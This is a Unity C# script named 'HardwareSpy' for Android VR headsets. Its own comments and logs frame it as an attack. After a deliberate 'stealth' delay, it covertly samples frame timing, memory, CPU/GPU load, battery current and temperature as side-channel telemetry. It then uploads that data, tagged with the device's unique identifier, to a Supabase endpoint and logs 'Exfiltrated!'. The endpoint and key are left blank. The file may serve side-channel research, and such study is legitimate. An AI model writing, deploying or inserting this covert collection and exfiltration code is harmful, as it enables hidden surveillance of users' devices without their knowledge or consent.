using System;
using System.Collections;
using System.Text;
using UnityEngine;
using UnityEngine.Networking;
using Unity.Profiling;
using Unity.XR.Oculus;

public class HardwareSpy : MonoBehaviour
{
    [Header("Attack Configuration")]
    public float startDelay = 10f;
    public float samplingRate = 0.1f;
    public int captureDuration = 10;

    // PRIVATE variables mean the Unity Inspector cannot see or overwrite them!

    // paste the keys in when you want to use it
    private string supabaseBaseUrl = "";
    private string supabaseKey = "";

    private StringBuilder csvData = new StringBuilder();

    // Unity Profilers (Release-Safe)
    ProfilerRecorder totalUsedMemoryRecorder;
    ProfilerRecorder mainThreadTimeRecorder;

    // Android Native Hooks
    private AndroidJavaObject currentActivity;
    private AndroidJavaObject batteryManager;
    private bool isAndroid;

    // Frame Timing Jitter
    private float frameTimeAccumulator = 0f;
    private int frameCount = 0;
    private float worstFrameTime = 0f;
    private float bestFrameTime = float.MaxValue;

    void Awake()
    {
        DontDestroyOnLoad(this.gameObject);
        InitializeAndroidHooks();
        Stats.PerfMetrics.EnablePerfMetrics(true);
    }

    private void InitializeAndroidHooks()
    {
        isAndroid = Application.platform == RuntimePlatform.Android;
        if (isAndroid)
        {
            try
            {
                using (AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
                {
                    currentActivity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
                    batteryManager = currentActivity.Call<AndroidJavaObject>("getSystemService", "batterymanager");
                    Debug.Log("HARDWARE SPY: Android Hooks initialized successfully.");
                }
            }
            catch (Exception e)
            {
                Debug.LogWarning("HARDWARE SPY: Failed to hook Android APIs: " + e.Message);
            }
        }
    }

    void OnEnable()
    {
        totalUsedMemoryRecorder = ProfilerRecorder.StartNew(ProfilerCategory.Memory, "Total Used Memory");
        mainThreadTimeRecorder = ProfilerRecorder.StartNew(ProfilerCategory.Internal, "Main Thread", 15);
    }

    void OnDisable()
    {
        if (totalUsedMemoryRecorder.Valid) totalUsedMemoryRecorder.Dispose();
        if (mainThreadTimeRecorder.Valid) mainThreadTimeRecorder.Dispose();
    }

    void Update()
    {
        float dt = Time.unscaledDeltaTime;
        frameTimeAccumulator += dt;
        frameCount++;
        if (dt > worstFrameTime) worstFrameTime = dt;
        if (dt < bestFrameTime) bestFrameTime = dt;
    }

    void ResetFrameMetrics()
    {
        frameTimeAccumulator = 0f;
        frameCount = 0;
        worstFrameTime = 0f;
        bestFrameTime = float.MaxValue;
    }

    IEnumerator Start()
    {
        csvData.AppendLine("Timestamp,TotalUsedMem,CpuUtil,GpuUtil,BatteryMicroAmps,BatteryTemp,BatteryLevel,AvgFPS,WorstFrameMs,BestFrameMs,MainThreadMs");
        yield return StartCoroutine(AttackRoutine());
    }

    IEnumerator AttackRoutine()
    {
        Debug.Log($"HARDWARE SPY: Stealth phase. Waiting {startDelay} seconds...");
        yield return new WaitForSeconds(startDelay);

        Debug.Log("HARDWARE SPY: Commencing side-channel telemetry capture...");
        float startTime = Time.time;
        ResetFrameMetrics();

        while (Time.time < startTime + captureDuration)
        {
            yield return new WaitForSeconds(samplingRate);
            float currentTime = Time.realtimeSinceStartup;

            // 1. Frame Timing Jitter
            float avgFrameTime = (frameCount > 0) ? (frameTimeAccumulator / frameCount) : 0f;
            float avgFps = (avgFrameTime > 0) ? (1f / avgFrameTime) : 0f;
            float worstMs = worstFrameTime * 1000f;
            float bestMs = (bestFrameTime < float.MaxValue) ? bestFrameTime * 1000f : 0f;

            // 2. Unity Profiler Metrics
            long usedMem = totalUsedMemoryRecorder.LastValue;
            double mainThreadMs = mainThreadTimeRecorder.LastValue * (1e-6);

            // 3. Oculus Compute Metrics
            float cpuUtil = Stats.PerfMetrics.CPUUtilizationAverage;
            float gpuUtil = Stats.PerfMetrics.GPUUtilization;

            // 4. Android Power & Thermal Metrics
            int currentMicroAmps = 0;
            float batteryTemp = 0f;
            float batteryLevel = SystemInfo.batteryLevel;

            if (isAndroid && currentActivity != null && batteryManager != null)
            {
                try
                {
                    currentMicroAmps = batteryManager.Call<int>("getIntProperty", 2);

                    using (AndroidJavaObject intentFilter = new AndroidJavaObject("android.content.IntentFilter", "android.intent.action.BATTERY_CHANGED"))
                    using (AndroidJavaObject batteryIntent = currentActivity.Call<AndroidJavaObject>("registerReceiver", null, intentFilter))
                    {
                        if (batteryIntent != null)
                        {
                            int tempRaw = batteryIntent.Call<int>("getIntExtra", "temperature", 0);
                            batteryTemp = tempRaw / 10f;
                        }
                    }
                }
                catch { }
            }

            // Append Row
            csvData.AppendLine($"{currentTime:F4},{usedMem},{cpuUtil:F4},{gpuUtil:F4},{currentMicroAmps},{batteryTemp:F2},{batteryLevel:F2},{avgFps:F2},{worstMs:F2},{bestMs:F2},{mainThreadMs:F4}");

            ResetFrameMetrics();
        }

        Debug.Log("HARDWARE SPY: Capture complete. Exfiltrating...");
        yield return StartCoroutine(UploadToSupabase());
    }

    IEnumerator UploadToSupabase()
    {
        if (string.IsNullOrEmpty(supabaseBaseUrl) || string.IsNullOrEmpty(supabaseKey) || supabaseBaseUrl.Contains("YOUR_SUPABASE"))
        {
            Debug.LogError("HARDWARE SPY: Invalid Supabase credentials.");
            yield break;
        }

        string cleanCsv = csvData.ToString().Replace("\r", "").Replace("\n", "\\n");
        string jsonPayload = "{\"device_id\": \"" + SystemInfo.deviceUniqueIdentifier + "\", \"csv_dump\": \"" + cleanCsv + "\"}";

        using (UnityWebRequest www = new UnityWebRequest(supabaseBaseUrl, "POST"))
        {
            byte[] bodyRaw = Encoding.UTF8.GetBytes(jsonPayload);
            www.uploadHandler = new UploadHandlerRaw(bodyRaw);
            www.downloadHandler = new DownloadHandlerBuffer();

            www.SetRequestHeader("Content-Type", "application/json");
            www.SetRequestHeader("apikey", supabaseKey);
            www.SetRequestHeader("Authorization", "Bearer " + supabaseKey);
            www.SetRequestHeader("Prefer", "return=representation");

            yield return www.SendWebRequest();

            if (www.result == UnityWebRequest.Result.Success) { Debug.Log("HARDWARE SPY: Exfiltrated!"); csvData.Clear(); }
            else { Debug.LogError("HARDWARE SPY: Failed: " + www.error); }
        }
    }
}